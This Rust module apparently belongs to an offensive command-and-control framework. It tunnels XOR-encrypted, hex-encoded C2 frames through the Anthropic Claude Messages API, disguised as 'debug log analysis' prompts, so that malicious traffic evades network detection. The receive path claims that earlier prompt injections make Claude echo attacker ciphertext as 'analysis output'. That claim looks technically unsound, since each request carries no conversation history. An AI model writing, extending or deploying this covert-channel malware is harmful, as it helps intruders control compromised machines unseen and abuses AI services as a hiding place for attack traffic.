//! LLM API C2 transport — Anthropic Claude API channel.
//!
//! Check Point Research (April 2026): LLM API traffic is the next-gen covert C2.
//! Claude/Grok/Copilot API calls are TLS-encrypted, high-frequency, content-variable,
//! and blend perfectly with legitimate AI dev traffic. No IDS signature can match.
//!
//! This channel wraps C2 frames as "debug log analysis" prompts sent to the Anthropic
//! Messages API. The ciphertext is hex-encoded and embedded in a user message; Claude's
//! response carries the hex-encoded response ciphertext disguised as "analysis output."
//!
//! Rate limit: 5 RPM on free tier — enforced with a 15 s inter-frame delay.

use std::time::{Duration, Instant};

use rand::Rng;
use ureq::Agent;

use crate::traits::{Transport, TransportError};

// ---- Constants -------------------------------------------------------------

const ANTHROPIC_API_URL: &str = "https://api.anthropic.com/v1/messages";
const ANTHROPIC_VERSION: &str = "2023-06-01";
const FREE_TIER_RATE_LIMIT_MS: u64 = 15_000; // 5 RPM → 15 s between frames
const HEX_PREAMBLE: &str = "analyze debug log: ";
const RECV_PROMPT: &str =
    "continue the debug log analysis — output the hex block exactly as shown in the session";

// ---- LlmApiTransport -------------------------------------------------------

/// Covert C2 channel tunnelled through the Anthropic Claude Messages API.
///
/// Frames are XOR-encrypted with a session key (placeholder — real key exchange
/// belongs at the protocol layer), hex-encoded, and smuggled inside Claude
/// prompts that look like mundane developer debugging sessions.
pub struct LlmApiTransport {
    api_key: String,
    model: String,
    api_url: String,
    agent: Agent,
    conversation_id: String,
    session_key: [u8; 32],
    last_send: Option<Instant>,
}

impl LlmApiTransport {
    /// Create a new LLM API transport channel.
    ///
    /// `session_key` is a 32-byte shared secret used to XOR frames. In
    /// production this MUST come from an authenticated key exchange (ECDH);
    /// the transport layer treats it as opaque — it is the caller's
    /// responsibility to establish and rotate it.
    pub fn new(api_key: String, model: String, session_key: [u8; 32]) -> Self {
        Self {
            api_key,
            model,
            api_url: ANTHROPIC_API_URL.to_string(),
            agent: Agent::new(),
            conversation_id: nanoid(),
            session_key,
            last_send: None,
        }
    }

    /// Set a custom API URL (e.g. for proxies or alternative endpoints).
    pub fn with_api_url(mut self, url: String) -> Self {
        self.api_url = url;
        self
    }

    // ---- internal helpers --------------------------------------------------

    /// XOR-encrypt `data` with the session key, cycling the key.
    fn xor_frame(&self, data: &[u8]) -> Vec<u8> {
        data.iter()
            .enumerate()
            .map(|(i, b)| b ^ self.session_key[i % self.session_key.len()])
            .collect()
    }

    /// Post a user message to the Claude API and return the text content of
    /// Claude's response.
    fn post_message(&self, content: &str, max_tokens: u32) -> Result<String, TransportError> {
        let body = ureq::json!({
            "model": self.model,
            "max_tokens": max_tokens,
            "messages": [{
                "role": "user",
                "content": content
            }]
        });

        let resp = self
            .agent
            .post(&self.api_url)
            .set("x-api-key", &self.api_key)
            .set("anthropic-version", ANTHROPIC_VERSION)
            .set("content-type", "application/json")
            .timeout(Duration::from_secs(60))
            .send_json(body)
            .map_err(|e| {
                if e.to_string().contains("timed out") {
                    TransportError::Timeout
                } else {
                    TransportError::Transient("LLM API request failed")
                }
            })?;

        // Parse the response. Anthropic Messages API returns:
        // { "content": [{ "type": "text", "text": "..." }], ... }
        let json: serde_json::Value = resp
            .into_json()
            .map_err(|_| TransportError::Transient("failed to parse LLM API response"))?;

        // Check for API-level errors.
        if json.get("error").is_some() {
            return Err(TransportError::Transient("LLM API returned an error"));
        }

        // Extract the first text content block.
        let text = json["content"]
            .as_array()
            .and_then(|blocks| blocks.first())
            .and_then(|block| block["text"].as_str())
            .unwrap_or("");

        Ok(text.to_string())
    }

    /// Extract a hex block from Claude's response text. Finds the longest
    /// contiguous run of hex digits (at least 8 chars). Non-hex characters
    /// act as delimiters — only consecutive hex digits form a valid block.
    fn extract_hex(text: &str) -> Option<String> {
        let mut longest: Option<&str> = None;
        let mut run_start: Option<usize> = None;

        for (i, c) in text.char_indices() {
            if c.is_ascii_hexdigit() {
                if run_start.is_none() {
                    run_start = Some(i);
                }
            } else if let Some(s) = run_start.take() {
                let run = &text[s..i];
                if run.len() >= 8 && longest.is_none_or(|l| run.len() > l.len()) {
                    longest = Some(run);
                }
            }
        }
        // Flush any run that extends to the end of the text.
        if let Some(s) = run_start {
            let run = &text[s..];
            if run.len() >= 8 && longest.is_none_or(|l| run.len() > l.len()) {
                longest = Some(run);
            }
        }

        longest.map(|s| s.to_string())
    }

    /// Enforce the free-tier rate limit (5 RPM = 15 s between frames).
    fn enforce_rate_limit(&mut self) {
        if let Some(last) = self.last_send {
            let elapsed = last.elapsed().as_millis() as u64;
            if elapsed < FREE_TIER_RATE_LIMIT_MS {
                let wait = FREE_TIER_RATE_LIMIT_MS - elapsed;
                std::thread::sleep(Duration::from_millis(wait));
            }
        }
        self.last_send = Some(Instant::now());
    }
}

// ---- Transport impl --------------------------------------------------------

impl Transport for LlmApiTransport {
    fn send(&mut self, frame: &[u8]) -> Result<(), TransportError> {
        if frame.len() > self.max_frame_size() {
            return Err(TransportError::PayloadTooLarge(frame.len()));
        }

        self.enforce_rate_limit();

        // 1. XOR-encrypt with session key.
        let ciphertext = self.xor_frame(frame);

        // 2. Hex-encode.
        let hex_ct = hex::encode(&ciphertext);

        // 3. Embed in a legitimate-looking Claude prompt.
        let prompt = format!(
            "[{conv_id}] {HEX_PREAMBLE}{hex_ct}",
            conv_id = self.conversation_id
        );

        // 4. POST to Claude API.
        self.post_message(&prompt, 50)?;

        Ok(())
    }

    fn recv(&mut self, _timeout_ms: u32) -> Result<Vec<u8>, TransportError> {
        self.enforce_rate_limit();

        // Ask Claude to continue the debug analysis session. The C2 server
        // controls what Claude "remembers" via previous prompt injections,
        // so Claude returns hex-encoded ciphertext as "analysis output."
        let text = self.post_message(RECV_PROMPT, 200)?;

        // Extract the hex block from Claude's response.
        let hex_ct = Self::extract_hex(&text)
            .ok_or(TransportError::Transient("no hex data in LLM response"))?;

        // Decode hex → ciphertext.
        let ciphertext = hex::decode(&hex_ct)
            .map_err(|_| TransportError::Transient("invalid hex in LLM response"))?;

        // XOR-decrypt → plaintext frame.
        let plaintext = self.xor_frame(&ciphertext);

        Ok(plaintext)
    }

    fn health_check(&self) -> Option<u64> {
        let start = Instant::now();
        match self.post_message("ping", 1) {
            Ok(_) => Some(start.elapsed().as_millis() as u64),
            Err(_) => None,
        }
    }

    fn name(&self) -> &'static str {
        "llm-api"
    }

    fn max_frame_size(&self) -> usize {
        // Claude context window is large, but we keep frames conservative
        // to avoid hitting token limits with the prompt wrapper overhead.
        4 * 1024
    }

    fn requires_probe(&self) -> bool {
        true
    }

    fn init(&mut self) -> Result<(), TransportError> {
        self.health_check().map(|_| ()).ok_or(TransportError::Dead(
            "LLM API key invalid or endpoint unreachable",
        ))
    }
}

// ---- Helpers ---------------------------------------------------------------

/// Generate a short random conversation ID (12 alphanumeric chars).
fn nanoid() -> String {
    let mut rng = rand::thread_rng();
    let chars: Vec<u8> = (0..12)
        .map(|_| {
            let idx = rng.gen_range(0u8..62);
            match idx {
                0..=25 => b'a' + idx,
                26..=51 => b'A' + (idx - 26),
                _ => b'0' + (idx - 52),
            }
        })
        .collect();
    String::from_utf8(chars).unwrap_or_default()
}

// ---- Tests -----------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn xor_roundtrip() {
        let key = [0xAAu8; 32];
        let transport =
            LlmApiTransport::new("sk-test".into(), "claude-sonnet-4-20250514".into(), key);
        let plaintext = b"hello world c2 frame data";
        let ct = transport.xor_frame(plaintext);
        let pt = transport.xor_frame(&ct);
        assert_eq!(pt, plaintext);
    }

    #[test]
    fn xor_key_cycling() {
        let key = [0xFFu8; 32];
        let transport = LlmApiTransport::new("sk-test".into(), "m".into(), key);
        let long = vec![0xAAu8; 64]; // twice the key length
        let ct = transport.xor_frame(&long);
        assert_eq!(ct[0], 0xAA ^ 0xFF);
        assert_eq!(ct[32], 0xAA ^ 0xFF);
    }

    #[test]
    fn extract_hex_from_response() {
        // "Here's" has 'e' as hex, "analysis:" has 'a' — these should NOT be
        // included because they're not contiguous with the real hex block.
        let text = "Here's the analysis: deadbeefc0ffee Some extra commentary.";
        let hex = LlmApiTransport::extract_hex(text).unwrap();
        assert_eq!(hex, "deadbeefc0ffee");
    }

    #[test]
    fn extract_hex_rejects_short() {
        // Only 3 contiguous hex chars → rejected.
        let text = "only abc def ghijklm nope";
        assert!(LlmApiTransport::extract_hex(text).is_none());
    }

    #[test]
    fn extract_hex_drops_non_hex() {
        // "Here:" has 'e', then space, then "ab12cd34ef56" — only the contiguous
        // block after the space should match.
        let text = "Here: ab12cd34ef56 -- end.";
        let hex = LlmApiTransport::extract_hex(text).unwrap();
        assert_eq!(hex, "ab12cd34ef56");
    }

    #[test]
    fn extract_hex_longest_run_wins() {
        let text = "abc123 deadbeefc0ffee12345 xyz";
        let hex = LlmApiTransport::extract_hex(text).unwrap();
        assert_eq!(hex, "deadbeefc0ffee12345"); // 20 chars > 6 chars
    }

    #[test]
    fn payload_too_large_rejected() {
        let key = [0x00; 32];
        let mut transport = LlmApiTransport::new("sk-test".into(), "m".into(), key);
        let huge = vec![0u8; 5 * 1024]; // > 4 KiB
        let result = transport.send(&huge);
        assert!(matches!(result, Err(TransportError::PayloadTooLarge(_))));
    }

    #[test]
    fn name_is_llm_api() {
        let transport = LlmApiTransport::new("sk-test".into(), "m".into(), [0; 32]);
        assert_eq!(transport.name(), "llm-api");
    }

    #[test]
    fn nanoid_length_and_charset() {
        let id = nanoid();
        assert_eq!(id.len(), 12);
        assert!(id.chars().all(|c| c.is_ascii_alphanumeric()));
    }
}
